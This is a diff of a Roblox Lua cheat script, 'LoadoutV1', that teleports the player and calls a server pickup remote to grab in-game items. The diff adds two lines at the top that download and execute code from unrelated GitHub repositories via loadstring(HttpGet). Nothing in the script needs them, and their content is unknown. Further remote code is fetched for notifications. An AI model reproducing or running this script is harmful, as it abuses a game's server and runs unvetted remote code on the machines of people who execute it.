@@ -1,96 +1,112 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ngigerngieofoepdo/VersionTwo/refs/heads/main/Dalgona"))()
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ngigerngieofoepdo/BetterFindAMopImGettingStickyInHisBitch/refs/heads/main/Idkdkdkyes"))()
 
--- Load Orion Library
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local SectionLabel = Instance.new("TextLabel")
+local Toggle = Instance.new("TextButton")
+local LoadoutButton1 = Instance.new("TextButton")
 
--- Create the main window
-local Window = OrionLib:MakeWindow({
-    Name = "LoadoutV1",
-    HidePremium = false,
-    SaveConfig = true,
-    ConfigFolder = "OrionTest"
-})
+ScreenGui.Name = "LoadoutGUI"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Create a tab
-local Tab = Window:MakeTab({
-    Name = "Loadouts",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 300, 0, 400)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.Parent = ScreenGui
 
--- Welcome notification
-OrionLib:MakeNotification({
-    Name = "Hi!",
-    Content = "Welcome!",
-    Image = "rbxassetid://4483345998",
-    Time = 5
-})
+SectionLabel.Name = "SectionLabel"
+SectionLabel.Size = UDim2.new(1, 0, 0, 50)
+SectionLabel.Position = UDim2.new(0, 0, 0, 0)
+SectionLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+SectionLabel.Text = "Loadouts"
+SectionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+SectionLabel.TextSize = 20
+SectionLabel.Parent = MainFrame
 
--- Add button for Protection Loadout
-Tab:AddButton({
-    Name = "Protection Loadout",
-    Callback = function()
-        local function invokePickupTool(itemName)
-            local pickupTool = workspace.Services and workspace.Services:FindFirstChild("PickupTool")
-            if pickupTool then
-                local args = {
-                    [1] = "correct_identifier",
-                    [2] = itemName
-                }
-                pickupTool:InvokeServer(unpack(args))
-            end
+Toggle.Name = "Toggle"
+Toggle.Size = UDim2.new(0, 200, 0, 50)
+Toggle.Position = UDim2.new(0.5, -100, 0, 60)
+Toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Toggle.Text = "Enable Loadouts"
+Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+Toggle.TextSize = 18
+Toggle.Parent = MainFrame
+
+LoadoutButton1.Name = "LoadoutButton1"
+LoadoutButton1.Size = UDim2.new(0, 200, 0, 50)
+LoadoutButton1.Position = UDim2.new(0.5, -100, 0, 120)
+LoadoutButton1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+LoadoutButton1.Text = "Loadout 1"
+LoadoutButton1.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadoutButton1.TextSize = 18
+LoadoutButton1.Parent = MainFrame
+
+local isEnabled = true
+Toggle.MouseButton1Click:Connect(function()
+    isEnabled = not isEnabled
+    Toggle.Text = isEnabled and "Disable Loadouts" or "Enable Loadouts"
+end)
+
+LoadoutButton1.MouseButton1Click:Connect(function()
+    if not isEnabled then return end
+
+    local function invokePickupTool(itemName)
+        local pickupTool = workspace.Services and workspace.Services:FindFirstChild("PickupTool")
+        if pickupTool then
+            local args = {
+                [1] = "correct_identifier",
+                [2] = itemName
+            }
+            pickupTool:InvokeServer(unpack(args))
         end
-
-        local function teleportAndPickup()
-            wait(1)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-751.308716, 120.934639, -3174.425537))
-            for i = 1, 3 do
-                invokePickupTool("Artifact C#615")
-            end
-
-            wait(1)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1405.102051, -253.162231, -1853.779907))
-            for i = 1, 3 do
-                invokePickupTool("Artifact B#615")
-            end
-
-            wait(1)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1349.432617, -460.606537, -1579.741455))
-            for i = 1, 3 do
-                invokePickupTool("Artifact A#286")
-            end
-
-            wait(1)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-94.258743, 233.663437, -2794.046875))
-            for i = 1, 3 do
-                invokePickupTool("Assistant Drone")
-            end
-
-            wait(1)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1375.454712, 175.646347, -1501.651001))
-            for i = 1, 3 do
-                invokePickupTool("Gatling Gun#490")
-            end
-
-            wait(1)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-661.720093, 13.630915, 894.568970))
-
-            local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
-            local Notify = AkaliNotif.Notify
-
-            Notify({
-                Description = "Thanks for using LoadoutV1!",
-                Title = "Made By Agent_R/THE REAL SIGMA/irizzupgyats on discord!",
-                Duration = 10
-            })
-        end
-
-        teleportAndPickup()
     end
-})
 
--- Initialize the Orion Library
-OrionLib:Init()
+    local function teleportAndPickup()
+        wait(1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-751.308716, 120.934639, -3174.425537))
+        for i = 1, 3 do
+            invokePickupTool("Artifact C#615")
+        end
 
--- Uncomment to destroy the interface
--- OrionLib:Destroy()
+        wait(1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1405.102051, -253.162231, -1853.779907))
+        for i = 1, 3 do
+            invokePickupTool("Artifact B#615")
+        end
+
+        wait(1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1349.432617, -460.606537, -1579.741455))
+        for i = 1, 3 do
+            invokePickupTool("Artifact A#286")
+        end
+
+        wait(1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-94.258743, 233.663437, -2794.046875))
+        for i = 1, 3 do
+            invokePickupTool("Assistant Drone")
+        end
+
+        wait(1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1375.454712, 175.646347, -1501.651001))
+        for i = 1, 3 do
+            invokePickupTool("Gatling Gun#490")
+        end
+
+        wait(1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-661.720093, 13.630915, 894.568970))
+
+        local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
+        local Notify = AkaliNotif.Notify
+
+        Notify({
+            Description = "Thanks for using LoadoutV1!",
+            Title = "Made By Agent_R/THE REAL SIGMA/irizzupgyats on discord!",
+            Duration = 10
+        })
+    end
+
+    teleportAndPickup()
+end)
